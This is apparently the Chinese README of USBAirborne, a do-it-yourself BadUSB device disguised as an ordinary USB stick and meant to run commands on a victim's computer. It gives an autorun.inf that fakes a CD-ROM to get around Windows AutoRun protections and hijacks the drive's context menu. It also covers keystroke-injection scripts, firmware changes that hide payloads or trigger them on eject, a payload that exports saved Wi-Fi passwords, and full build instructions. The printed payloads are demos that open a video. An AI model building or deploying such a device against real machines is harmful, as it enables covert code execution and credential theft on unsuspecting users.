# USBAirborne

更高级的BadUSB

------

[**中文**](https://github.com/Push3AX/USBAirborne/blob/main/readme_cn.md) | [English](https://github.com/Push3AX/USBAirborne/blob/main/readme.md)

USBAirborne伪装成U盘，但当受害者将它插入电脑，它会执行指定的命令或程序。

- 支持BadUSB攻击、AutoRun攻击
- 内置4MB存储空间，可伪装为4GB的U盘
- 低成本（约10元 / 个）
- 标准G2板型，可装入常见U盘外壳

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/1.png" width="50%" />

------

## 快速开始

USBAirborne的攻击行为由其根目录下的`autorun.inf`文件内容决定，支持AutoRun攻击和BadUSB攻击（也可同时进行）。项目的 [Payload](Payload/readme.md) 目录下包含一系列演示攻击脚本。

------

## AutoRun攻击

将 [Payload](Payload/readme.md) 目录下的`AutorunDemo.inf`复制到USBAirborne根目录下，并重命名为`autorun.inf`。

插入电脑后， USBAirborne显示为一个4GB的U盘。在打开U盘时（包括双击打开、右键-打开、右键-在新窗口中打开），USBAirborne会执行预置代码，打开浏览器播放视频。

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/autorun.gif"/>

具体而言，`AutorunDemo.inf`中的`[AutoRun]`段，会让USBAirborne模拟成CD-ROM设备，以绕过Windows的AutoRun安全限制：

```ini
[AutoRun]
autoplay=true

;将驱动器图标伪装为U盘图标
icon=shell32.dll,79

;驱动器名称
label=USB

;攻击Payload，此处为打开网页
;可以将需要运行的EXE或BAT放置在U盘根目录，将open改为填写文件名
;例如：open=payload.exe
open=explorer https://www.bilibili.com/video/BV1zK4y1S71s/

;劫持右键菜单
;如果修改了Payload，此处也需修改
shell\AutoRun=Open Drive(&D)
shell\AutoRun\Command=explorer https://www.bilibili.com/video/BV1zK4y1S71s/
shell\open\Command=explorer https://www.bilibili.com/video/BV1zK4y1S71s/
shell\opennewwindow\Command=explorer https://www.bilibili.com/video/BV1zK4y1S71s/
```

------

## 关闭CD-ROM只读

前一案例中，配置文件会使得USBAirborne模拟成只读的CD-ROM设备，无法写入或修改文件。

将USBAirborne PCB上的开关1打开，可以关闭攻击模式。此时USBAirborne不会执行攻击内容，也不再进入只读的CD-ROM状态。

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/Switch_cn.png"/>



------

## BadUSB攻击

BadUSB是另一种攻击模式，通过模拟键盘的输入来执行操作。

将 [Payload](Payload/readme.md) 目录下的`BadUSB.inf`复制到USBAirborne根目录下，并重命名为`autorun.inf`。

插入电脑后， USBAirborne通过模拟键盘按下Win+R键打开`运行`窗口，输入`notepad`打开记事本，并输入演示内容、打开一个网页。

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/badusb.gif"/>

具体而言，`BadUSB.inf`中的两个`[BadUSB]`标记之间包含了要执行的键盘操作：

```ini
[BadUSB]
[BypassChineseIME]
[Win+R]
[Delay]
[Delay]
notepad
[Enter]
[Delay]
[Delay]
Hi! This is a test of USBAirborne
[Win+R]
[Delay]
[Delay]
https://www.bilibili.com/video/BV1zK4y1S71s/[Enter]
[BadUSB]
```

其中`[BypassChineseIME]`用于智能绕过中文输入法。

------

## 保存BadUSB的执行结果

将 [Payload](Payload/readme.md) 目录下的`GrabWLAN.inf`复制到USBAirborne根目录下，并重命名为`autorun.inf`。

同时将 [Payload](Payload/readme.md) 目录下的`USB.AIRBORNE`也复制到USBAirborne根目录下，该文件用于定位USBAirborne的盘符。

插入电脑后， USBAirborne会执行特定的CMD命令，导出WLAN配置和密码，并将CMD的输出结果保存在USBAirborne根目录下，文件名为主机名+随机数。

![saveResult](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/saveResult.PNG)

------

## BadUSB高级命令

BadUSB的配置文件支持一些组合键和高级命令：

1. [BypassChineseIME]：智能绕过中文输入法。
2. [Format]：快速格式化USBAirborne。
3. [Enter]：按下回车键
4. [Shift]：按下Shift键
5. [Capslock]：切换大小写
6. [Win]：按下Win键
7. [Win+R]：打开“运行”窗口
8. [Alt+F4]：关闭当前窗口
9. [Win+D]：显示桌面
10. [Win+L]：锁定计算机
11. [Win+E]：打开Windows资源管理器
12. [Ctrl+Alt+Del]：打开安全选项
13. [Delay]：等待500毫秒

------

## 编译固件

USBAirborne.uvproj目录下是USBAirborne的固件源代码。

编译需要Keil环境。在Keil安装完成后，打开[WCHISPTool](https://www.wch.cn/download/WCHISPTool_Setup_exe.html)，点击 功能-添加WCH MCU到KEIL器件库。

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/keil_cn.png"/>

此时使用Keil打开USBAirborne.uvproj目录下的Project.uvproj，应当可以编译USBAirborne的固件。

### 内置BadUSB Payload到固件

USBAirborne在执行BadUSB时需要从Flash中读取Payload。如果希望更快地执行BadUSB或完全隐藏Payload，可以直接将Payload内置在固件中。

Main.C中的BadUSBDemo()是一个示例。修改ExecBadUSB为1，该Payload会被执行。

```c
UINT8 ExecBadUSB = 1;

void BadUSBDemo()
{
	UINT8 Payload[]="https://www.bilibili.com/video/BV1zK4y1S71s/\n";
	mDelaymS(1000);
	SendKey(KB_LeftShift, KB_NULL);	//切换输入法
	mDelaymS(500);
	SendKey(KB_LeftGUI, KB_R);
	mDelaymS(500);
	SendString(Payload,sizeof(Payload)/sizeof(Payload[0]));
	mDelaymS(500);
}

void main(void)
{
	...
	while(1)
	{
		if(ExecBadUSB == 1 && AttackEnabled == 1)
		{
			ExecBadUSB=0;
			BadUSBDemo();
		}
		mDelaymS(100);
	}
	...
}
```

### 在其它时刻执行BadUSB

BadUSB一般会在USBAirborne插入计算机后立刻执行，如果你希望在其它时刻执行，可通过在USB的不同UFI命令中将ExecBadUSB置1实现。

例如，在USB.c的UFI_staStoUnit()中将ExecBadUSB置1，可以实现在USBAirborne被弹出时执行BadUSB Payload:

```c
void  UFI_staStoUnit(void)
{
	CH375BULKDOWN = 0;
	CH375BULKUP = 0;
	BcswStatus = 0;
	mSenseKey = 0;
	mASC = 0;
	if(MassPara.cbw.cbwcb.buf1[4] & 0x02)
	{
		MediumPresent = (MassPara.cbw.cbwcb.buf1[4] & 0x01) ? 1 : 0;
	}
	else if(MassPara.cbw.cbwcb.buf1[4] & 0x01)
	{
		MediumPresent = 1;
	}
	ExecBadUSB=1; //添加此行
}
```



------


## 制造指南

### 硬件设计

USBAirborne的硬件设计开源在OSHWHub，请移步至：

https://oshwhub.com/PushEAX/3079905e2c434c54902d77ab60f6c747

### BOM与成本

| 元器件号 | 名称           | 封装类型            | 数量 | 总价（元） |
| -------- | -------------- | ------------------- | ---- | ---------- |
| C1,C4    | 10uF 电容      | C0603               | 2    | 0.1        |
| C2,C3    | 100nF 电容     | C0603               | 2    | 0.1        |
| R1,R2    | 22k 电阻       | R0603               | 2    | 0.1        |
| SW1      | 2Pin开关       |                     | 1    | 2          |
| U1       | CH552G         | SOP-16_L10.0-W3.9   | 1    | 3.8        |
| U2       | P25Q32H-SSH-IT | SOIC-8_L4.9-W3.9    | 1    | 2.2        |
| USB1     | USB2.0-A-公头  | USB-A-TH_USB-A-F-90 | 1    | 0.4        |

*备注：CH552G可以替换为CH551G、CH554G。P25Q32H可以被替换为其它W25Q兼容 SPI Flash，容量最大支持16MB。*

### 制造步骤

如果你希望自己制作USBAirborne，以下是简要步骤：

1. 下载USBAirborne的[Gerber](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/Hardware/Gerber_PCB1_2022-06-19.zip)文件，将其发送给PCB制造商生产。

2. 参照BOM章节，焊接各个元器件。

3. 将USBAirborne的第二个开关打开，进入烧录模式。

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/Switch_cn.png"/>

4. 在 [此处](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/USBAirborne.uvproj/USBAirborne_2.2.hex)下载USBAirborne的固件。使用[WCHISPTool](https://www.wch.cn/downloads/WCHISPTool_Setup_exe.html)烧录固件。

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/WCHISPTool_cn.png"/>

5. 关闭烧录模式，打开读写模式，将`autorun.inf`拷贝到USBAirborne根目录。
